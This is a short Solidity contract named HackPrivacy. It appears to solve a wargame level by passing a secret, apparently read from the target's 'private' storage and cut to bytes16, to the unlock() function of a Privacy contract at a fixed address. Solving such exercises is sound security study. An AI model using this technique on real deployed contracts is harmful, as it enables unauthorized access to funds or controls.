// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy{
    function unlock(bytes16) public {}
}

contract HackPrivacy {
    Privacy public privacyContract = Privacy(0xDA6F8CE143C27848E71f4933513d22a2EeA94769);


    function hack(bytes32 _data) public {
        bytes16 key = bytes16(_data);
        privacyContract.unlock(key);
    }


}
